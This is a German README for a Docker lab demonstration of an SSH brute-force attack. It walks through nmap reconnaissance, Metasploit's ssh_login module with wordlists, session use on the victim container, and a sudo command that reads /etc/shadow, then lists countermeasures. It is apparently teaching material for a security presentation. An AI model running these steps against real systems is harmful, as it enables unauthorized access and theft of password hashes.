# Szenario 3: SSH Brute-Force (schwache Passwoerter)

Live-Demo: Der Angreifer findet einen offenen SSH-Server, **erraet per Brute-Force schwache
Passwoerter**, loggt sich ein und eskaliert ueber `sudo` zu **root** — alles aus Metasploit heraus.

## Hintergrund

Der dritte klassische Einfallsweg (nach CVE-Exploit in Szenario 1 und Trojaner in Szenario 2):
**schwache oder wiederverwendete Zugangsdaten**. Kein Exploit, keine Malware — der Angreifer
probiert einfach systematisch Benutzernamen + Passwoerter durch, bis einer passt. Genau dafuer
bringt Metasploit das Modul `auxiliary/scanner/ssh/ssh_login` mit, das bei einem Treffer direkt
eine Shell-Session oeffnet.

## Architektur

```
┌──────────────────┐                          ┌──────────────────┐
│    attacker       │   1. Brute-Force          │     victim        │
│  10.30.0.10       │      ssh_login            │  10.30.0.20       │
│  Metasploit       │  ─── User+Pass-Listen ──▶ │  OpenSSH-Server   │
│  + /wordlists     │                           │                   │
│                   │   2. Treffer:             │  Accounts:        │
│  Shell-Session    │ ◀─── admin:password123 ───│   admin  (sudo)   │
│  → sudo → root    │       mitarbeiter:hallo123│   mitarbeiter     │
└──────────────────┘                          └──────────────────┘
                Docker-Netz: lab (10.30.0.0/24)
```

## Voraussetzungen

- Docker + Docker Compose
- ca. 2 GB freier Speicher (Metasploit-Image)
- Internetverbindung beim ersten Start (Image-Download)

## Start

```sh
cd szenario-3-ssh-bruteforce
docker compose up -d --build     # Container bauen & starten
docker attach ssh-attacker       # an msfconsole anhaengen
```

> **Tipp:** `Ctrl-P Ctrl-Q` loest die Konsole ab, ohne sie zu beenden.

## Demo-Ablauf (Copy-Paste-ready)

### Schritt 1: Reconnaissance — offenen SSH-Port finden

```
nmap -sV 10.30.0.20
```

**Erwartet:** Port `22/tcp open ssh OpenSSH`.

---

### Schritt 2: Brute-Force vorbereiten

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.30.0.20
set USER_FILE /wordlists/users.txt
set PASS_FILE /wordlists/passwords.txt
set STOP_ON_SUCCESS false
set VERBOSE true
```

**Was passiert:**
- `ssh_login` probiert jede Kombination aus Userliste und Passwortliste durch
- `STOP_ON_SUCCESS false` = es sucht **alle** schwachen Accounts (nicht nur den ersten)
- `VERBOSE true` = man sieht jeden Versuch live

---

### Schritt 3: Angriff starten

```
run
```

**Was passiert:** Bei jedem Treffer meldet Metasploit `[+] Success:` und oeffnet automatisch
eine **Command-Shell-Session**.

**Erwartet:**
```
[+] 10.30.0.20:22 - Success: 'admin:password123'
[+] 10.30.0.20:22 - Success: 'mitarbeiter:hallo123'
[*] SSH session 1 opened ...   (admin)
[*] SSH session 2 opened ...   (mitarbeiter)
```

> **Dauer:** Der Durchlauf aller Kombinationen dauert ~1–2 Minuten (jeder fehlgeschlagene
> SSH-Login ist absichtlich verzoegert). Das viele rote `[-] Failed:` gehoert dazu — gut
> sichtbar fuer die Demo. Wer es schneller will: `set STOP_ON_SUCCESS true` stoppt beim
> ersten Treffer (dann nur `admin`).

Gefundene Zugangsdaten anzeigen:

```
creds
```

Offene Sessions anzeigen:

```
sessions -l
```

---

### Schritt 4: Zugriff nutzen

In die Session des `admin` wechseln (Session-ID aus `sessions -l`):

```
sessions -i 1
```

Jetzt sind wir auf dem Opfer-Rechner:

```
id
hostname
ls -la /home
```

`Ctrl-Z` (bzw. `background`) bringt zurueck in die msfconsole.

---

### Schritt 5: Privilege Escalation — von admin zu root

Der `admin` ist in der `sudo`-Gruppe, und sein Passwort kennen wir bereits. Damit lesen wir die
Passwort-Hashes **aller** User aus `/etc/shadow`:

```
echo 'password123' | sudo -S cat /etc/shadow
```

**Was passiert:** Ein einziges schwaches Passwort gibt uns ueber `sudo` **vollen Root-Zugriff**.
Die Hashes aus `/etc/shadow` koennte der Angreifer anschliessend offline knacken (z. B. mit
John the Ripper / hashcat).

## Stop

```sh
docker compose down -v
```

## Kernaussagen fuer die Praesentation

1. **Kein Exploit noetig** — schwache Passwoerter sind die offene Tuer.
2. **Brute-Force ist billig & automatisiert** — Metasploit probiert in Sekunden hunderte Kombis.
3. **Ein Account genuegt** — ueber `sudo` wird aus einem Login schnell Root.
4. **Gegenmassnahmen:** starke, einzigartige Passwoerter, **SSH-Key-Auth statt Passwort**,
   `fail2ban`/Rate-Limiting, MFA, Account-Lockout, kein direkter Root-Login, Passwort-Policy.

## Hinweise

- Die schwachen Accounts (`admin:password123`, `mitarbeiter:hallo123`) sind im
  [victim/Dockerfile](victim/Dockerfile) bewusst angelegt; die Wortlisten liegen unter
  [wordlists/](wordlists/).
- Szenario 3 nutzt ein eigenes Subnetz (`10.30.0.0/24`) und kollidiert daher nicht mit
  Szenario 1 (`10.10.0.0/24`) oder 2 (`10.20.0.0/24`).
- In der Realitaet wuerde der Angreifer grosse Listen wie `rockyou.txt` nutzen; hier sind die
  Listen bewusst klein gehalten, damit die Demo schnell laeuft.
